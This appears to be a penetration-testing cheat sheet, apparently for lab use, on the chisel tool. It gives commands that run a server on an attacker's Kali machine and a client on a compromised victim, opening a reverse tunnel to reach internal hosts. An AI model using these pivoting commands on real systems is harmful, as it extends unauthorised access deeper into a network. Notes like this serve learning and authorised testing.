## Server
From kali/our machine at:
```
./chisel server -p 8000 --reverse
```
- `-p`, listening on port 8000
- `--reverse`, Allow clients to specify reverse port forwarding remotes in addition to normal remotes.

## Client
From client/victim:
```
./chisel client <server ip>:<server port> <local-host>:<local-port>:<local ip>:<remote-port>
```
- You can give it `R` for `local-host` to indicate that you want to listen on the remote host (ie, **open the listener on the server**). In that case, the tunnel will go in the reverse direction (from server to client).

## Server Listener
Using a reverse tunnel to open a listening port on Kali host that can now talk to hosts behind the initial compromised host:
```
./chisel server -p 8000 --reverse
```
```
./chisel client 10.10.14.3:8000 R:8001:10.10.10.10:80
```
- server/our machine -> `10.10.14.3`
- client/target machine -> `10.10.10.10`
